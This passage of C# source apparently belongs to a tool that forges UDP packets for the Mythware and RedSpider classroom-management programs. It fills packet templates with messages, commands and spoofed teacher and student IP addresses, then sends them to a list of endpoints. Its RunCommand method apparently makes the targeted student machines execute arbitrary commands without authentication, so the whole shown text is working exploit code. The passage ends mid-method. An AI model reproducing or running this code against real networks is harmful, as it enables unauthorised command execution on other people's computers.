    private static List<byte> ProcessBeforeSend(string content)
    {
        var arr = new List<byte>();

        foreach (char ch in content)
        {
            int code = ch;

            if (code > 0xFF)
            {
                byte low = (byte)(code & 0xFF);
                byte high = (byte)((code >> 8) & 0xFF);

                arr.Add(low);
                arr.Add(high);
            }
            else
            {
                byte low = (byte)code;
                byte high = 0x00;

                arr.Add(low);
                arr.Add(high);
            }
        }

        return arr;
    }

    public static byte[] BuildMythwareMsgPack(string content) => BuildMythwarePack(content, 578);

    public static byte[] BuildMythwareCmdPack(string content) => BuildMythwarePack(content, 56);

    private static byte[] BuildMythwarePack(string content, int index)
    {
        var formattedCommand = ProcessBeforeSend(content);
        var result = (byte[])mythwareCmdPack.Clone();
        foreach (byte b in formattedCommand)
        {
            result[index] = b;
            index++;
        }
        return result;
    }

    public static byte[][] BuildRedSpiderPack(string msg, string studentIp, string teacherIp)
    {
        byte[] result = redSpiderPack;
        byte[] result2 = redSpiderPack2;
        int num = 20;
        foreach (string str in studentIp.Split('.'))
        {
            result[num] = Convert.ToByte(str);
            num++;
        }
        num = 16;
        foreach (string str in teacherIp.Split('.'))
        {
            result2[num] = Convert.ToByte(str);
            num++;
        }
        num = 48;
        foreach (char ch in msg.Split(' ')[0])
        {
            result2[num] = Convert.ToByte(ch);
            num += 2;
        }
        num = 568;
        foreach (char ch in msg.Replace(msg.Split(' ')[0] + " ", ""))
        {
            result2[num] = Convert.ToByte(ch);
            num += 2;
        }
        return [result, result2];
    }

    public static void SendMessage(string message, IEnumerable<KeyValuePair<string, int>> endpoints)
    {
        foreach (var endpoint in endpoints)
        {
            byte[] pack = BuildMythwareMsgPack(message);
            using var server = new UdpClient();
            server.Send(pack, pack.Length, new IPEndPoint(IPAddress.Parse(endpoint.Key), endpoint.Value));
        }
    }

    public static void RunCommand(string command, IEnumerable<KeyValuePair<string, int>> endpoints)
    {
        foreach (var endpoint in endpoints)
        {
            byte[] pack = BuildMythwareCmdPack(command);
            using var server = new UdpClient();
            server.Send(pack, pack.Length, new IPEndPoint(IPAddress.Parse(endpoint.Key), endpoint.Value));
        }

